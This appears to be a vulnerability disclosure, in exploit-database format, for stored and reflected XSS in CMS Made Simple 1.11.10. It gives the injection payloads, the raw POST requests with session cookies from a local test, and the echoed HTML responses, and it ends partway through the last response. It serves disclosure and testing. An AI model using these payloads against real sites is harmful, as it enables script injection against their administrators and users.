@@ -1,0 +1,104 @@
+Exploit Title : CMS Made Simple 1.11.10 Multiple XSS Vulnerability
+
+Google dork : N/A
+
+Date : 02/04/2014
+
+Exploit Author : Blessen Thomas
+
+Vendor Homepage : http://www.cmsmadesimple.org/
+
+Software Link : N/A
+
+Version : 1.11.10
+
+Tested on : Windows 7 hosted in WAMP server
+
+Type of Application :  open source content management system,
+
+
+
+
+
+Stored XSS :
+
+Login to the admin portal and access search functionality
+
+http://localhost/cmsmadesimple-1.11.10-full/index.php
+
+Here the " search " parameter is vulnerable to stored xss.
+
+Payload :
+
+'">><marquee><img src=x onerror=confirm(1)
+
+request:
+
+POST http://localhost/cmsmadesimple-1.11.10-full/ HTTP/1.1
+
+Host: localhost User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0)
+Gecko/20100101 Firefox/28.0 Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer:
+http://localhost/cmsmadesimple-1.11.10-full/index.php Cookie:
+_sx_=3ee623ee0900c03b; cms_admin_user_id=1;
+cms_passhash=fcb88b76587f0658cd2481a004312918;
+CMSSESSIDd508249c=qijlp266idmf9sjc51bai74lg7;
+PHPSESSID=5fvasiledip329l0bhr2ulb1j0;
+CMSSESSID7a29d042=qv3lpa3fpdflsmqac1icp5cfe7 Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded Content-Length: 153
+
+mact=Search%2Ccntnt01%2Cdosearch%2C0&cntnt01returnid=15&cntnt01searchinput=%27%22%3E%3E%3Cmarquee%3E%3Cimg+src%3Dx+onerror%3Dconfirm%281%29&submit=Submit
+
+response :
+
+
+<div id="search" class="core-float-right">
+            '">><marquee><img src=x onerror=confirm(1)
+          </div>
+             <a href="http://localhost/cmsmadesimple-1.11.10-full/"
+title="Home Page, shortcut key=1" >CMS Made Simple Site</a>
+</div>
+
+
+
+
+
+Reflected XSS :
+
+Login to the admin portal and click the "My Preferences" and click "My
+account" section.
+
+Here , the "email address" parameter is vulnerable to reflected XSS.
+
+Payload :
+
+"";</script><script>alert(0)</script><"
+
+request :
+
+POST
+http://127.0.0.1/cmsmadesimple-1.11.10-full/admin/myaccount.php?_sx_=1c8c76366630b299
+HTTP/1.1
+
+Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0)
+Gecko/20100101 Firefox/28.0 Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer:
+http://127.0.0.1/cmsmadesimple-1.11.10-full/admin/myaccount.php?_sx_=1c8c76366630b299Cookie:
+_sx_=1c8c76366630b299; cms_admin_user_id=1;
+cms_passhash=fcb88b76587f0658cd2481a004312918;
+CMSSESSIDd508249c=71ougg9mi3ikiilatfc0851no5 Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded Content-Length: 103
+
+active_tab=maintab&user=test&password=&passwordagain=&firstname=&lastname=&email="";</script><script>alert(0)</script><"&submit_account=Submit
+
+
+response :
+
+</aside>	 </div>	 <!-- end sidebar //-->	 <!-- start main
+-->	 <div id="oe_mainarea" class="cf">	 <aside class="message
+pageerrorcontainer" role="alert"><p>The email address entered is
+invalid: "";</script><script>alert(0)</script><"</p></aside><article
+role="main" class="content-inner"><header class="pageheader
+cf"><h1>My&nbsp;Account</h1><script type="text/javascript">
